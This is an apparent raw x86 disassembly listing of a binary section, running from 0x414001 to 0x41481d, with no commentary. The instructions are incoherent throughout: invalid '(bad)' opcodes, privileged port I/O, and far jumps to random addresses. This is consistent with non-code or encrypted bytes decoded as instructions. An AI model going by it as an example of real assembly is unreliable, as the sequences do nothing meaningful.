  414001:	les    esi,FWORD PTR [eax]
  414003:	imul   DWORD PTR [ebx+edi*2-0x4e]
  414007:	mov    ah,0x1
  414009:	test   al,0x36
  41400b:	cld    
  41400c:	out    0x36,al
  41400e:	out    0xc8,al
  414010:	sbb    DWORD PTR [ebp+0x7e],edx
  414013:	pop    ds
  414014:	cwde   
  414015:	rcl    BYTE PTR [ebx+0x52],cl
  414018:	xlat   BYTE PTR ds:[ebx]
  414019:	call   0x7284b4dd
  41401e:	jno    0xedfcdf28
  414024:	adc    eax,0x346e5f16
  414029:	test   bh,dl
  41402b:	pop    ecx
  41402c:	lea    esp,[eax+0x2857a4e0]
  414032:	sti    
  414033:	mov    esp,0x450c8a32
  414038:	rcr    eax,0x97
  41403b:	dec    BYTE PTR [ebx+0x3d]
  41403e:	jmp    0x654563e5
  414043:	rol    DWORD PTR ds:0x1578d60d,1
  414049:	nop
  41404a:	(bad)  
  41404b:	lock inc esp
  41404d:	(bad)
  414051:	cmc    
  414052:	jne    0x41405b
  414054:	ror    DWORD PTR [ecx+eiz*1+0x38],1
  414058:	gs push cs
  41405a:	mov    cl,0xf0
  41405c:	mov    DWORD PTR ds:0xe8d8b4b1,eax
  414062:	xlat   BYTE PTR ds:[ebx]
  414063:	fwait
  414064:	gs nop
  414066:	mov    ds:0xf7c79bef,eax
  41406b:	test   eax,0x67c4d91e
  414070:	in     al,0x61
  414072:	test   esp,ebp
  414074:	repnz mov bh,0xcb
  414077:	fsub   DWORD PTR [esi-0x1]
  41407a:	fisttp DWORD PTR [eax]
  41407c:	in     al,0xa3
  41407e:	outs   dx,BYTE PTR ds:[esi]
  41407f:	dec    esi
  414080:	sbb    eax,0x73a88979
  414085:	ins    DWORD PTR es:[edi],dx
  414086:	adc    al,0x7
  414088:	and    eax,0x689ab40
  41408d:	pop    ss
  41408e:	or     dl,BYTE PTR [eax]
  414090:	sbb    dh,ch
  414092:	fstp   QWORD PTR [ecx]
  414094:	outs   dx,DWORD PTR ds:[esi]
  414095:	push   es
  414096:	mov    ebx,0x77a33938
  41409b:	jbe    0x41404b
  41409d:	loope  0x41405d
  41409f:	mov    al,ds:0xf63ba6e2
  4140a4:	sahf   
  4140a5:	jno    0x41410f
  4140a7:	(bad)  
  4140a8:	fcmovu st,st(3)
  4140aa:	cdq    
  4140ab:	pop    eax
  4140ac:	dec    eax
  4140ad:	mov    ds:0xc403067d,eax
  4140b2:	mov    ebx,0xcbd558c0
  4140b7:	out    0xbb,eax
  4140b9:	sub    al,0x27
  4140bb:	adc    cl,BYTE PTR [edx+0x6be5b3a1]
  4140c1:	mov    esp,0xb3b6b9c5
  4140c6:	rol    DWORD PTR [edi+eax*2-0x65e947bc],0xbb
  4140ce:	mov    dl,0x42
  4140d0:	aad    0xa5
  4140d2:	jp     0x4140c7
  4140d4:	mov    dl,BYTE PTR [ebp+0x6727e5ff]
  4140da:	jp     0x414076
  4140dc:	sbb    ecx,ebx
  4140de:	ret    
  4140df:	xchg   esp,eax
  4140e0:	out    dx,al
  4140e1:	sub    al,dh
  4140e3:	icebp  
  4140e4:	pop    es
  4140e5:	(bad)  
  4140e6:	pop    ebp
  4140e7:	dec    edi
  4140e8:	dec    esi
  4140e9:	mov    esi,0xf7b00bf3
  4140ee:	pop    esp
  4140ef:	sbb    eax,0x4acaa234
  4140f4:	push   cs
  4140f5:	dec    edx
  4140f6:	inc    ebp
  4140f7:	jmp    0x6e96e49b
  4140fc:	xchg   ebp,eax
  4140fd:	mulps  xmm6,XMMWORD PTR [edx-0x1492e7ab]
  414104:	adc    al,0x2f
  414106:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414107:	pop    eax
  414108:	and    DWORD PTR [ecx-0x6a5c9f91],ebx
  41410e:	or     eax,DWORD PTR [ecx-0x46]
  414111:	test   eax,0xdbf2a1bb
  414116:	jecxz  0x414173
  414118:	mov    edx,0x1d8437e7
  41411d:	imul   esp,DWORD PTR [esi-0x3a],0x5f9101f0
  414124:	loope  0x414172
  414126:	cmp    al,0x3d
  414128:	sti    
  414129:	std    
  41412a:	mov    WORD PTR [esi-0x5ada31b7],ds
  414130:	and    al,0x23
  414132:	pop    ebx
  414133:	push   0xf6492afc
  414138:	sbb    DWORD PTR [ecx+0x67],ecx
  41413b:	(bad)  
  41413d:	add    eax,edx
  41413f:	or     al,0x15
  414141:	adc    DWORD PTR [ecx],ebp
  414143:	icebp  
  414144:	aas    
  414145:	add    al,0xa3
  414147:	xor    ebx,DWORD PTR [ecx-0x40]
  41414a:	fsub   QWORD PTR [edx+edi*2-0x5a0b45a2]
  414151:	inc    ebx
  414152:	clc    
  414153:	xchg   ebp,eax
  414154:	inc    ebp
  414155:	push   ebp
  414156:	por    mm2,QWORD PTR [ebx]
  414159:	jno    0x414147
  41415b:	clc    
  41415c:	pop    edi
  41415d:	mov    eax,0x37dfee32
  414162:	mov    ah,0xf4
  414164:	loop   0x414190
  414166:	push   eax
  414167:	ins    DWORD PTR es:[edi],dx
  414168:	aad    0xc8
  41416a:	push   edx
  41416b:	jmp    0xc91b:0x7f2310a3
  414172:	jmp    0x79b4f848
  414177:	ins    DWORD PTR es:[edi],dx
  414178:	push   0x58c89c09
  41417d:	pop    ecx
  41417e:	cmp    al,0xe
  414180:	leave  
  414181:	and    dh,BYTE PTR [esi]
  414183:	jmp    0x6689:0x2956c91d
  41418a:	jle    0x41412e
  41418c:	jle    0x414135
  41418e:	dec    ebx
  41418f:	xor    eax,0x67e0ad0a
  414194:	outs   dx,BYTE PTR ds:[esi]
  414195:	mov    al,ds:0x6837f195
  41419a:	jl     0x414128
  41419c:	or     eax,0x1f65588f
  4141a1:	cdq    
  4141a2:	pop    ecx
  4141a3:	mov    al,ds:0xfcc9f4e6
  4141a8:	(bad)  
  4141a9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4141aa:	mov    ds:0x44485703,eax
  4141af:	pop    es
  4141b0:	push   esp
  4141b1:	(bad)  
  4141b2:	add    dh,BYTE PTR [ecx]
  4141b4:	sbb    edx,DWORD PTR [edx+0x2e]
  4141b7:	xchg   ebp,eax
  4141b8:	sbb    al,0x64
  4141ba:	loop   0x41422e
  4141bc:	dec    bh
  4141be:	stos   DWORD PTR es:[edi],eax
  4141bf:	jns    0x414203
  4141c1:	adc    BYTE PTR [esi+0x20],bl
  4141c4:	sbb    dh,BYTE PTR [eax+eax*2+0x42]
  4141c8:	fwait
  4141c9:	ret    0x79f3
  4141cc:	out    0xd9,eax
  4141ce:	mov    ch,0xa4
  4141d0:	adc    BYTE PTR [ebx+0x13],bh
  4141d3:	bound  eax,QWORD PTR ds:0x88eee9a4
  4141d9:	dec    edi
  4141da:	nop
  4141db:	mov    al,0x4b
  4141dd:	mov    edx,edi
  4141df:	ss push edx
  4141e1:	stos   BYTE PTR es:[edi],al
  4141e2:	inc    esi
  4141e3:	dec    eax
  4141e4:	and    BYTE PTR [ebx+ebp*1-0x3],dh
  4141e8:	or     esp,DWORD PTR [eax+0x7f13a27b]
  4141ee:	or     edx,DWORD PTR [edx]
  4141f0:	pop    esp
  4141f1:	jle    0x4141d8
  4141f3:	push   edi
  4141f4:	mov    ch,dl
  4141f6:	mov    dh,0xc4
  4141f8:	hlt    
  4141f9:	(bad)  
  4141fb:	pop    ebx
  4141fc:	xor    eax,0x70f3e39c
  414201:	sbb    eax,0xba75cfcc
  414206:	adc    BYTE PTR [esi],al
  414208:	fisub  WORD PTR [ebp+ebp*1-0x80]
  41420c:	add    bl,BYTE PTR [edx-0x2a087a68]
  414212:	and    dl,ch
  414214:	loopne 0x414235
  414216:	rcr    BYTE PTR [ebx-0x66d206e0],1
  41421c:	out    dx,eax
  41421d:	add    ch,BYTE PTR [eax]
  41421f:	inc    ebp
  414220:	enter  0xe54c,0xec
  414224:	dec    eax
  414225:	test   eax,0x591c6684
  41422a:	mov    ebx,0x63781a72
  41422f:	call   0xfc0b:0xbb493
  414236:	sti    
  414237:	xlat   BYTE PTR ds:[ebx]
  414238:	jmp    0x414299
  41423a:	cwde   
  41423b:	xor    DWORD PTR [ecx+ebx*1],0xaa5d262d
  414242:	or     DWORD PTR [edx-0x1164d0e1],esp
  414248:	sub    eax,0xcf561ba2
  41424d:	test   ecx,ecx
  41424f:	loope  0x4141d8
  414251:	je     0x414259
  414253:	or     ah,al
  414255:	jle    0x41420b
  414257:	and    al,0x69
  414259:	aam    0x40
  41425b:	addr16 inc ebp
  41425d:	xchg   edi,eax
  41425e:	or     al,0xe9
  414260:	mul    BYTE PTR [ebx+0x6f]
  414263:	or     DWORD PTR [ecx+ebx*2],ebx
  414266:	xor    BYTE PTR [ecx+0x7e07953b],ah
  41426c:	ret    0xcba2
  41426f:	mov    eax,0x1980262e
  414274:	ins    DWORD PTR es:[edi],dx
  414275:	retf   0xfcd5
  414278:	pop    esp
  414279:	div    DWORD PTR [esi+0x26]
  41427c:	jns    0x4141ff
  41427e:	stc    
  41427f:	push   esp
  414280:	adc    eax,0xb67cbee4
  414285:	mov    BYTE PTR [eax+0x51d5ca5b],dl
  41428b:	jmp    0xbaa4:0x1f9378a9
  414292:	mov    ds:0x8fa25368,eax
  414297:	(bad)  
  414298:	mov    eax,ds:0xbf19a5a1
  41429d:	sbb    al,BYTE PTR [eax+0x1464905]
  4142a3:	shl    esi,1
  4142a5:	mov    ?,WORD PTR [edi-0x665a08ac]
  4142ab:	int    0x31
  4142ad:	arpl   WORD PTR [ebp+0x56345506],bp
  4142b3:	lock mov eax,0xe5e2948c
  4142b9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4142ba:	sbb    ch,al
  4142bc:	inc    ebx
  4142bd:	ins    BYTE PTR es:[edi],dx
  4142be:	add    al,0x7f
  4142c0:	sbb    al,0x49
  4142c2:	in     al,0x97
  4142c4:	test   DWORD PTR [esp+eax*1+0x29],0xe63ba20d
  4142cc:	add    DWORD PTR [edi],ebx
  4142ce:	lods   al,BYTE PTR ds:[esi]
  4142cf:	inc    ebx
  4142d0:	and    esp,DWORD PTR [edx]
  4142d2:	add    DWORD PTR [edx+0x259c076e],ebp
  4142d8:	rcr    DWORD PTR [ebx+0x1d],0xea
  4142dc:	fstp   DWORD PTR [esi-0x4d94575]
  4142e2:	out    dx,al
  4142e3:	jns    0x4142b8
  4142e5:	dec    ecx
  4142e6:	mov    ecx,0xbda0af0a
  4142eb:	test   dh,cl
  4142ed:	or     eax,0xe56f5e
  4142f2:	lods   eax,DWORD PTR ds:[esi]
  4142f3:	in     eax,0x36
  4142f5:	lahf   
  4142f6:	inc    edx
  4142f7:	stc    
  4142f8:	and    ecx,DWORD PTR [ecx]
  4142fa:	add    edi,DWORD PTR [ecx-0x18bd9af0]
  414300:	out    dx,eax
  414301:	call   0x93b6d09f
  414306:	imul   esp,ebp,0xd67980f4
  41430c:	push   ss
  41430d:	dec    ecx
  41430e:	and    DWORD PTR [esi+ebp*1],esi
  414311:	call   0x87a7060
  414316:	push   ds
  414317:	mov    cs,WORD PTR ds:0x45858ba0
  41431d:	sti    
  41431e:	js     0x4142a3
  414320:	and    bl,BYTE PTR [ecx+0x8]
  414323:	jne    0x41439e
  414325:	fldenv [ebx-0x465271f]
  41432b:	mov    dl,BYTE PTR ds:[eax]
  41432e:	aam    0xf8
  414330:	sbb    ch,BYTE PTR [ebx-0x52]
  414333:	dec    esi
  414334:	fst    DWORD PTR [esi]
  414336:	mov    edi,0x3b6613b4
  41433b:	in     eax,0x56
  41433d:	scas   al,BYTE PTR es:[edi]
  41433e:	adc    DWORD PTR [ecx],eax
  414340:	cvtsd2si esi,QWORD PTR [eax]
  414344:	mov    ds:0x80afe94d,eax
  414349:	fdiv   DWORD PTR [esp+edx*4+0x78915bb1]
  414350:	mov    ch,0xd2
  414352:	cdq    
  414353:	in     eax,0x23
  414355:	mov    ebx,0x2986dca4
  41435a:	and    DWORD PTR [ebp+0x762868f7],edx
  414360:	idiv   DWORD PTR [edx+edi*4+0x3a0c9502]
  414367:	out    0x3e,eax
  414369:	(bad)  
  41436a:	mov    ds:0x83e9a72b,eax
  41436f:	shr    BYTE PTR [edx-0x5c],cl
  414372:	jae    0x4143ef
  414374:	push   ds
  414375:	push   ss
  414376:	or     DWORD PTR [eax-0x5b],ebp
  414379:	ins    BYTE PTR es:[edi],dx
  41437a:	xor    esi,ecx
  41437c:	nop
  41437d:	(bad)  
  41437e:	int    0xa5
  414380:	push   eax
  414381:	mov    edx,0x992d6803
  414386:	push   es
  414387:	jnp    0x414360
  414389:	sub    dl,BYTE PTR [edx]
  41438b:	sbb    al,0x63
  41438d:	sar    bl,1
  41438f:	ret    
  414390:	and    al,0x12
  414392:	vaddsd xmm1,xmm6,xmm0
  414396:	add    edx,esp
  414398:	sbb    ebp,DWORD PTR ds:0x506069e6
  41439e:	aam    0xcd
  4143a0:	xor    DWORD PTR [esi],edi
  4143a2:	mov    ch,0x14
  4143a4:	push   cs
  4143a5:	pop    edi
  4143a6:	add    DWORD PTR [esi-0x7b],esi
  4143a9:	xchg   ebp,eax
  4143aa:	aam    0xe4
  4143ac:	pause  
  4143ae:	push   ss
  4143af:	stc    
  4143b0:	sbb    al,0xf9
  4143b2:	in     eax,0xe2
  4143b4:	cmp    al,0x21
  4143b6:	and    BYTE PTR [ebx+0x3f0bc467],ch
  4143bc:	call   0xa4df:0x19faeadb
  4143c3:	dec    edx
  4143c4:	xchg   edi,eax
  4143c5:	js     0x414406
  4143c7:	lods   eax,DWORD PTR ds:[esi]
  4143c8:	(bad)  
  4143c9:	je     0x41437b
  4143cb:	inc    esp
  4143cc:	js     0x414408
  4143ce:	add    eax,0x4fe4460d
  4143d3:	popa   
  4143d4:	or     al,0xa1
  4143d6:	mov    bl,0xa6
  4143d8:	aaa    
  4143d9:	fst    QWORD PTR [ecx-0x64]
  4143dc:	not    DWORD PTR [esi-0x4d983b44]
  4143e2:	adc    BYTE PTR [edx-0x143919ab],cl
  4143e8:	fimul  WORD PTR [ebx+edx*8]
  4143eb:	xchg   esi,eax
  4143ec:	push   ds
  4143ed:	test   eax,0x7d2e8085
  4143f2:	sbb    BYTE PTR [esi],bl
  4143f4:	add    edi,DWORD PTR [ecx-0x5d]
  4143f7:	mov    al,ds:0xea166975
  4143fc:	jmp    0xa0e0:0x6474e04c
  414403:	sub    eax,0x54b20435
  414408:	ins    DWORD PTR es:[edi],dx
  414409:	xchg   ebx,eax
  41440a:	push   ss
  41440b:	xchg   DWORD PTR ds:0xf1ef1afe,edx
  414411:	iret   
  414412:	push   ecx
  414413:	pusha  
  414414:	dec    ebp
  414415:	or     cl,BYTE PTR [esi]
  414417:	pop    ss
  414418:	and    edi,DWORD PTR [ecx-0x59e0ff35]
  41441e:	cmp    ch,BYTE PTR [esi]
  414420:	mov    ch,0x77
  414422:	mov    al,ds:0x921234eb
  414427:	push   0xbb084af2
  41442c:	push   ss
  41442d:	test   eax,0x20be7c70
  414432:	sti    
  414433:	sbb    ebp,esp
  414435:	mov    al,0xb1
  414437:	jmp    0x4143c5
  414439:	push   eax
  41443a:	repz pop edx
  41443c:	sbb    ebp,DWORD PTR [ecx-0x3e]
  41443f:	push   ebx
  414440:	lahf   
  414441:	mov    bh,BYTE PTR [esi-0x29]
  414444:	retf   0x1b9d
  414447:	lods   eax,DWORD PTR ds:[esi]
  414448:	xchg   DWORD PTR ds:0x5767d88f,eax
  41444e:	or     DWORD PTR [esi-0x579c33ac],0x45
  414455:	(bad)  
  414456:	jmp    0xb669:0x9fb353aa
  41445d:	mov    ebx,0xd1b15fdd
  414462:	jno    0x414495
  414464:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414465:	sar    DWORD PTR [esi+0xc6d9742],cl
  41446b:	mov    edx,0xbebf2c97
  414470:	xor    DWORD PTR [esi-0x1e],ebx
  414473:	pop    eax
  414474:	out    dx,eax
  414475:	add    al,BYTE PTR [ebp-0x1085aa17]
  41447b:	push   ebx
  41447c:	pop    ss
  41447d:	cdq    
  41447e:	push   ss
  41447f:	xchg   ebx,eax
  414480:	adc    BYTE PTR [ecx-0x16e0c4c3],ah
  414486:	sbb    al,0x9
  414488:	in     al,dx
  414489:	lods   al,BYTE PTR ds:[esi]
  41448a:	in     eax,0xc8
  41448c:	sbb    bl,BYTE PTR [esi-0x21804275]
  414492:	hlt    
  414493:	mov    dh,0x1c
  414495:	xchg   ebx,eax
  414496:	cmp    edi,0x34b0ea27
  41449c:	enter  0xa38,0xe0
  4144a0:	js     0x414459
  4144a2:	clc    
  4144a3:	mov    al,0xa6
  4144a5:	out    0x2d,al
  4144a7:	sbb    BYTE PTR [ecx-0x74d4efbd],dh
  4144ad:	test   al,0x44
  4144af:	in     eax,0x40
  4144b1:	test   DWORD PTR [edx],esp
  4144b3:	push   ebp
  4144b4:	and    ah,BYTE PTR [ebp-0x39f1b479]
  4144ba:	cmp    al,0xc5
  4144bc:	leave  
  4144bd:	jle    0x41451b
  4144bf:	and    ebx,DWORD PTR [eax]
  4144c1:	push   edi
  4144c2:	mov    ebx,0x7b2ffc94
  4144c7:	out    0x54,eax
  4144c9:	jmp    0xe7bcaaae
  4144ce:	mov    dl,0xb4
  4144d0:	nop
  4144d1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4144d2:	pop    ebx
  4144d3:	push   0x1c
  4144d5:	jp     0x4144ca
  4144d7:	es ja  0x414470
  4144da:	js     0x41454a
  4144dc:	fcmovb st,st(5)
  4144de:	mov    ah,0xc4
  4144e0:	int3   
  4144e1:	retf   
  4144e2:	mov    edx,0xf2a555d6
  4144e7:	call   0x354f513a
  4144ec:	push   ss
  4144ed:	stc    
  4144ee:	scas   eax,DWORD PTR es:[edi]
  4144ef:	daa    
  4144f0:	in     eax,0x8
  4144f2:	xor    eax,0x8b9dcd00
  4144f7:	fld    DWORD PTR [eax]
  4144f9:	outs   dx,BYTE PTR ds:[esi]
  4144fa:	push   cs
  4144fb:	rol    BYTE PTR [esi],cl
  4144fd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4144fe:	aam    0x4e
  414500:	scas   eax,DWORD PTR es:[edi]
  414501:	push   0xb9d6e671
  414506:	pushfw 
  414508:	or     eax,0x6de9dcb5
  41450d:	mov    ds:0x9394efab,eax
  414512:	out    dx,eax
  414513:	push   ebp
  414514:	bnd jbe 0x41456d
  414517:	fisttp QWORD PTR [ebx+0x26]
  41451a:	jl     0x4144e2
  41451c:	(bad)  
  41451d:	dec    ebx
  41451e:	sub    eax,0xc67bb0b1
  414523:	pop    es
  414524:	inc    ecx
  414525:	mov    bh,BYTE PTR [ebp+0x21]
  414528:	mov    ah,0x9a
  41452a:	daa    
  41452b:	aad    0x7f
  41452d:	cmp    DWORD PTR [edi],eax
  41452f:	fadd   DWORD PTR [ebx]
  414531:	add    DWORD PTR ds:0xaa99192b,ecx
  414537:	mov    edi,ds
  414539:	push   ecx
  41453a:	in     al,0x73
  41453c:	and    BYTE PTR [esi+0xd],0x7a
  414540:	in     eax,0xd2
  414542:	fcomi  st,st(5)
  414544:	cmp    dh,bh
  414546:	push   ds
  414547:	mov    ch,0x2e
  414549:	dec    edi
  41454a:	cmp    edx,DWORD PTR [edi+edx*2+0x56]
  41454e:	mov    cl,0x54
  414550:	or     BYTE PTR [edx+0x21],dh
  414553:	ficom  WORD PTR [ebp+0x6a]
  414556:	fucomip st,st(5)
  414558:	dec    ebp
  414559:	push   ebp
  41455a:	mov    edx,0x349965e7
  41455f:	mov    bl,0x98
  414561:	dec    ebp
  414562:	test   BYTE PTR [esi-0x1],0x52
  414566:	mov    ebx,0x2eae7500
  41456b:	out    0x31,eax
  41456d:	mov    ebx,0x19185503
  414572:	inc    ebx
  414573:	stos   BYTE PTR es:[edi],al
  414574:	add    dh,BYTE PTR [edx+0x7bb403c4]
  41457a:	cmp    al,0x38
  41457c:	std    
  41457d:	mov    ebx,0x61b399bf
  414582:	mov    dl,0xa6
  414584:	adc    al,0xeb
  414586:	sub    BYTE PTR [ebp+0x17],dh
  414589:	and    DWORD PTR [ecx-0x1b1cb4cb],ecx
  41458f:	mov    dh,BYTE PTR [esi+0x1ac9db90]
  414595:	pop    ss
  414596:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414597:	repz icebp 
  414599:	sbb    BYTE PTR [ecx-0x4d302491],ah
  41459f:	hlt    
  4145a0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4145a1:	std    
  4145a2:	sub    ebp,DWORD PTR [ebx]
  4145a4:	test   ebp,eax
  4145a6:	ret    
  4145a7:	jmp    0x414576
  4145a9:	into   
  4145aa:	mov    ch,0x75
  4145ac:	sbb    BYTE PTR [ecx-0xd88db3f],ch
  4145b2:	icebp  
  4145b3:	shl    DWORD PTR [ebx],1
  4145b5:	popf   
  4145b6:	fisttp DWORD PTR [edx]
  4145b8:	or     eax,0xcf1496c9
  4145bd:	fidiv  WORD PTR [eax]
  4145bf:	adc    ebp,DWORD PTR [ecx+edi*2-0x43]
  4145c3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4145c4:	mov    cl,0xe
  4145c6:	mov    BYTE PTR [edx+0x577b9b5d],ah
  4145cc:	and    bl,BYTE PTR [edi]
  4145ce:	clc    
  4145cf:	or     dh,BYTE PTR [edi-0x26]
  4145d2:	(bad)  
  4145d3:	sub    al,0x2c
  4145d5:	jl     0x414589
  4145d7:	aam    0x7f
  4145d9:	push   ecx
  4145da:	imul   edx,DWORD PTR [ebx-0x1844eb5b],0xffffff9e
  4145e1:	sahf   
  4145e2:	xchg   esp,eax
  4145e3:	cmc    
  4145e4:	sbb    cl,BYTE PTR [ecx-0x227725d7]
  4145ea:	adc    eax,DWORD PTR [eax-0x4bb45e96]
  4145f0:	(bad)  
  4145f1:	mov    esp,0x9de96c7e
  4145f6:	(bad)  
  4145f7:	fcomp  DWORD PTR [ecx]
  4145f9:	in     eax,0xb0
  4145fb:	xor    al,0xfb
  4145fd:	mov    ch,0x24
  4145ff:	xchg   esi,eax
  414600:	not    BYTE PTR [ebx]
  414602:	ret    0xe50c
  414605:	scas   al,BYTE PTR es:[edi]
  414606:	mov    cl,0x5a
  414608:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414609:	sbb    al,0xbd
  41460b:	push   edx
  41460c:	es nop
  41460e:	mov    dl,0x64
  414610:	jmp    0xfde2fdf8
  414615:	push   ebp
  414616:	add    edx,ebx
  414618:	data16 mov al,ds:0x504d2079
  41461e:	cmc    
  41461f:	leave  
  414620:	shl    bl,1
  414622:	mov    al,0x91
  414624:	icebp  
  414625:	mov    al,ds:0xdaf4e883
  41462a:	jp     0x4145f3
  41462c:	cli    
  41462d:	cdq    
  41462e:	retf   
  41462f:	rcl    ah,1
  414631:	fidiv  WORD PTR [ecx+ebx*8-0x31]
  414635:	mov    WORD PTR [edx-0x53],ss
  414638:	mov    cl,0x9
  41463a:	mov    eax,0x352a9ac4
  41463f:	adc    ebp,esi
  414641:	jge    0x41469d
  414643:	dec    ebx
  414644:	cmc    
  414645:	in     eax,0xbb
  414647:	cli    
  414648:	and    ebp,DWORD PTR [eax+0x343b32a2]
  41464e:	push   esi
  41464f:	in     eax,dx
  414650:	push   edi
  414651:	adc    esi,DWORD PTR [esp+eiz*8+0x107ea880]
  414658:	test   edi,esp
  41465a:	mov    ?,ebx
  41465c:	push   ebx
  41465d:	jne    0x41463a
  41465f:	mov    al,0x17
  414661:	sub    DWORD PTR [ebx],ecx
  414663:	(bad)  
  414664:	push   ebp
  414665:	or     DWORD PTR [ebx+0x2e],ebp
  414668:	call   0xe00:0xeb9c7ba6
  41466f:	mov    edi,0xdc3df726
  414674:	and    edi,ecx
  414676:	mov    bh,0x4d
  414678:	inc    edx
  414679:	cmp    al,0xa0
  41467b:	fwait
  41467c:	cmp    esp,DWORD PTR [ecx+0x48eb910b]
  414682:	jb     0x41468f
  414684:	xor    esp,eax
  414686:	mov    gs:0x4b01413,eax
  41468c:	push   0x651f347a
  414691:	mov    bl,0x3
  414693:	repz push 0x1cb7cc39
  414699:	leave  
  41469a:	scas   eax,DWORD PTR es:[edi]
  41469b:	retf   0x95a1
  41469e:	fwait
  41469f:	push   edi
  4146a0:	lea    esp,[ebx+0x3]
  4146a3:	sbb    dl,BYTE PTR [ebp-0x191a2349]
  4146a9:	aas    
  4146aa:	adc    BYTE PTR [edx-0xad226e5],ch
  4146b0:	loop   0x4146d5
  4146b2:	jg     0x41471f
  4146b4:	and    al,0x9b
  4146b6:	sub    eax,DWORD PTR [ecx-0x3c]
  4146b9:	das    
  4146ba:	dec    eax
  4146bb:	sub    DWORD PTR [edx],eax
  4146bd:	push   edi
  4146be:	sbb    BYTE PTR [ebx+edi*8-0x45],dl
  4146c2:	jecxz  0x414678
  4146c4:	jae    0x414669
  4146c6:	dec    edx
  4146c7:	inc    edi
  4146c8:	mov    ebx,0xd2aebd1c
  4146cd:	pop    ds
  4146ce:	mov    dh,0xe1
  4146d0:	neg    dl
  4146d2:	mov    esi,eax
  4146d4:	pop    ds
  4146d5:	lods   eax,DWORD PTR ds:[esi]
  4146d6:	jo     0x41473f
  4146d8:	pop    ebx
  4146d9:	es (bad) 
  4146db:	cdq    
  4146dc:	mov    ah,0xa1
  4146de:	pop    ebx
  4146df:	xor    edi,DWORD PTR [edi-0x5e]
  4146e2:	call   0x2ae19d9a
  4146e7:	jmp    0x1616f41d
  4146ec:	ss loop 0x4146bd
  4146ef:	xor    al,0x98
  4146f1:	out    0xd6,eax
  4146f3:	das    
  4146f4:	push   ss
  4146f5:	nop
  4146f6:	data16 fstp DWORD PTR [eax]
  4146f9:	ins    DWORD PTR es:[edi],dx
  4146fa:	push   es
  4146fb:	cmp    eax,0xf17b95fa
  414700:	into   
  414701:	aad    0x71
  414703:	inc    esi
  414704:	pusha  
  414705:	dec    edx
  414706:	mov    al,BYTE PTR [edx+0x35]
  414709:	add    eax,0xfffffff3
  41470c:	xchg   ecx,eax
  41470d:	fdivrp st(2),st
  41470f:	and    al,0xe5
  414711:	add    al,0xd1
  414713:	jmp    0xe11cfe27
  414718:	jns    0x414784
  41471a:	into   
  41471b:	fistp  WORD PTR [ecx]
  41471d:	imul   edi,DWORD PTR [ebp-0x7e],0xd16839b7
  414724:	cmc    
  414725:	and    ecx,DWORD PTR [ebp-0x10]
  414728:	in     eax,0xd4
  41472a:	mov    ds:0xff449ee2,eax
  41472f:	pop    es
  414730:	xchg   ecx,eax
  414731:	imul   BYTE PTR [ebp+edx*8-0x5d]
  414735:	and    al,0xbb
  414737:	out    dx,eax
  414738:	(bad)
  41473b:	out    0x69,al
  41473d:	popa   
  41473e:	sti    
  41473f:	add    dl,BYTE PTR [edi+0x27]
  414742:	push   0x2e185614
  414747:	lds    ecx,FWORD PTR [eax]
  414749:	mov    bh,0xd1
  41474b:	test   eax,0x198997c6
  414750:	(bad)  
  414751:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414752:	mov    ebx,0x85cc9403
  414757:	adc    ecx,esi
  414759:	sbb    dh,bl
  41475b:	enter  0x8be7,0x25
  41475f:	aad    0x1a
  414761:	pop    esp
  414762:	fdivrp st(3),st
  414764:	in     al,dx
  414765:	jmp    0x2a38bcc5
  41476a:	das    
  41476b:	sub    ch,dl
  41476d:	mov    eax,ds:0xedd7f067
  414772:	jno    0x414745
  414774:	mov    ch,0xd7
  414776:	mov    ebp,0x8d06a3b4
  41477b:	mov    bh,0xf5
  41477d:	in     eax,dx
  41477e:	shl    dl,1
  414780:	fistp  DWORD PTR ss:[esi]
  414783:	and    BYTE PTR [ecx],0x4
  414786:	jecxz  0x414715
  414788:	adc    ah,bh
  41478a:	mov    edi,0x7e56d74
  41478f:	cmp    esp,DWORD PTR [edi-0x7a2184b2]
  414795:	pop    edx
  414796:	fcomip st,st(1)
  414798:	and    al,0xde
  41479a:	sbb    bh,BYTE PTR [edx]
  41479c:	sbb    al,0x57
  41479e:	mov    bh,0xc4
  4147a0:	adc    BYTE PTR [edi+0x63],al
  4147a3:	lds    eax,FWORD PTR ds:0xcee5f664
  4147a9:	xor    bl,bl
  4147ab:	ins    BYTE PTR es:[edi],dx
  4147ac:	sbb    DWORD PTR [ecx-0x47],edi
  4147af:	ret    
  4147b0:	add    al,BYTE PTR [eax-0x32ca7fc1]
  4147b6:	cld    
  4147b7:	cmp    eax,0xf01b9c98
  4147bc:	inc    ebx
  4147bd:	jmp    0xe3d4:0xa9190406
  4147c4:	inc    esi
  4147c5:	int3   
  4147c6:	sub    ebp,ebp
  4147c8:	mov    ds:0x5642dbd0,eax
  4147cd:	fimul  WORD PTR [esi+0x3ae31ef5]
  4147d3:	jg     0x4147e9
  4147d5:	mov    cl,BYTE PTR [esi]
  4147d7:	pop    edx
  4147d8:	jmp    0x2045:0x2f7837a4
  4147df:	pop    es
  4147e0:	aad    0x3d
  4147e2:	and    al,0xf4
  4147e4:	outs   dx,DWORD PTR ds:[esi]
  4147e5:	push   ecx
  4147e6:	xchg   edx,eax
  4147e7:	fist   WORD PTR [edi+0x5e1a41aa]
  4147ed:	and    dl,ah
  4147ef:	or     DWORD PTR [edi-0x462c8fca],edx
  4147f5:	xchg   BYTE PTR [edi-0x1b],bh
  4147f8:	or     DWORD PTR [ecx+esi*8-0x175b566a],0xffffff94
  414800:	das    
  414801:	lahf   
  414802:	retf   
  414803:	xor    al,0x37
  414805:	fwait
  414806:	icebp  
  414807:	mov    bl,BYTE PTR [ebx-0x4a]
  41480a:	repz mov esi,0x54b993b9
  414810:	jnp    0x4147d8
  414812:	push   ds
  414813:	fst    DWORD PTR [ebp+0x78]
  414816:	or     eax,0xca2cb6f4
  41481b:	test   DWORD PTR [ebx],esp
  41481d:	jns    0x4147db
